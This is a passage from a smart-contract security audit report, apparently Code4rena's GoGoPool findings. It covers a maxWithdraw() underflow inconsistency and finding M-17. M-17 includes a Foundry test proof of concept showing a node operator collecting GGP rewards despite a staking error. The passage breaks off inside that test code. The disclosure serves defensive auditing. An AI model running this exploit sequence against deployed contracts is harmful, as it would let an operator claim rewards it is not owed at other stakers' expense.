<code>1000</code> AVAX.</li>\n<li>current cycle rewards is <code>4000</code> AVAX and <code>block.timestamp</code> is currently in the middle of the cycle so current rewards is <code>2000</code> AVAX.</li>\n<li><code>totalAssets()</code> is <code>totalReleaseAssets + current rewards = 10000 + 2000 = 12000</code>.</li>\n<li>contract balance is <code>10000 + 4000 - 1000 = 13000</code> AVAX.</li>\n<li>user1 has 90% contract shares and calls <code>maxWithdraw()</code> and code would calculate user assets as <code>10800</code> AVAX and available AVAX in contract as <code>totalAssets() - stakingTotalAssets = 12000 - 1000 = 11000</code> and code would return <code>10800</code> as answer.</li>\n<li>now if user1 withdraws <code>10800</code> AVAX code would revert in the function <code>beforeWithdraw()</code> because code would try to execute <code>totalReleaseAssets = totalReleaseAssets - amount = 10000 - 10800</code> and it would revert because of the underflow. so in reality user1 couldn’t withdraw <code>10800</code> AVAX which was the return value of the <code>maxWithdraw()</code> for user1.</li>\n</ol>\n<p>The root cause of the bug is that the withdrawal amount is subtracted from <code>totalReleaseAssets</code> and so max withdrawal can never be <code>totalReleaseAssets</code> and function <code>maxWithdraw()</code> should never return value bigger than <code>totalReleaseAssets</code>. (the bug in function <code>maxRedeem()</code> is similar)</p>\n<p>This bug would cause other contract or front end calls to fail, for example if the logic is something like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">   amount = maxWithdraw(user);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   TokenggAVAX.withdrawAVAX(amount);</span></span></code></pre>\n<p>According the function definitions this code should work bug because of the the issue there are situations that this would revert and other contracts and UI can’t work properly with the protocol.</p>\n<h3 id=\"tools-used-11\" style=\"position:relative;\"><a href=\"#tools-used-11\" aria-label=\"tools used 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider <code>totalReleaseAssets</code> in max withdrawal amount too.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/476\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/476#issuecomment-1412684720\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown an inconsistency between the view functions and the actual behaviour of <code>TokenggAVAX</code>.<br>\nThis breaks ERC4626, as well as offering subpar experience for end-users.</p>\n<p>For this reason I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/476#issuecomment-1421431600\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged.</p>\n<p>I’ve added some tests to explore this more, but it’s a known issue with how we’ve implemented the streaming of rewards in our 4626. Some more context here <a href=\"https://github.com/fei-protocol/ERC4626/issues/24\">https://github.com/fei-protocol/ERC4626/issues/24</a>.</p>\n<p>It’s most prevalent with low liquidity in ggAVAX. </p>\n<p>We’re not going to fix in the first iteration of protocol.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-17-nodeop-can-get-rewards-even-if-there-was-an-error-in-registering-the-node-as-a-validator\" style=\"position:relative;\"><a href=\"#m-17-nodeop-can-get-rewards-even-if-there-was-an-error-in-registering-the-node-as-a-validator\" aria-label=\"m 17 nodeop can get rewards even if there was an error in registering the node as a validator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/471\">[M-17] NodeOp can get rewards even if there was an error in registering the node as a validator</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/471\">0xbepresent</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/829\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/570\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/469\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/327\">cccz</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/192\">cozzetti</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L56\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L56</a><br>\n<a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L89\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L89</a></p>\n<p>The <a href=\"https://multisiglabs.notion.site/Architecture-Protocol-Overview-4b79e351133f4d959a65a15478ec0121\">documentation</a> says that the NodeOps could be elegible for GGP rewards if they have a valid minipool. The problem is that if the MiniPool <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484\">has an error</a> while registering the node as a validator, the NodeOp can get rewards even if the minipool had an error.</p>\n<p>When the Rialto calls <code>recordStakingError()</code> function the <code>AssignedHighWater</code> is not reseted. So the malicious NodeOp (staker) can create pools which will have an error in the registration and get rewards from the protocol.</p>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I created a test in <code>ClaimNodeOp.t.sol</code>:</p>\n<ol>\n<li>NodeOp1 creates minipool</li>\n<li>Rialto calls claimAndInitiateStaking, recordStakingStart and recordStakingError()</li>\n<li>NodeOp1 withdraw his funds from minipool</li>\n<li>NodeOp1 can get rewards even if there was an error with the node registration as validator.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRecordStakingErrorCanGetRewards</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// NodeOp can get rewards even if there was an error in registering the node as a validator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 1. NodeOp1 creates minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 2. Rialot/multisig claimAndInitiateStaking, recordStakingStart and recordStakingError</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 3. NodeOp1 withdraw his funds from minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 4. NodeOp1 can get rewards even if there was an error with the node registration as validator.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;nodeOp1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getRewardsCycleSeconds</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rewardsPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startRewardsCycle</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 1. NodeOp1 creates minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk7\">200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;liqStaker1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 2. Rialto/multisig claimAndInitiateStaking, recordStakingStart and recordStakingError</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">txID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;txid&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;INVALID_NODEID&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getIndexOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingError</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxTotalRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxLiquidStakerRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTotalAVAXLiquidStakerAmt</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssigned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The highwater doesnt get reset in this case</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssignedHighWater</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1Updated</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 3. NodeOp1 withdraw his funds from the minipool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">priorBalance_nodeOp</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawMinipoolFunds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">((</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">priorBalance_nodeOp</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// 4. NodeOp1 can get rewards even if there was an error with the node registration as validator.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2629756</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nopClaim</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isEligible</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//&lt;- The NodeOp1 is eligible for rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nopClaim</span><span class=\"mtk1\">.</span><span class=\"mtk11\">calculateAndDistributeRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">, </span><span class=\"mtk7\">200</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertGt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span 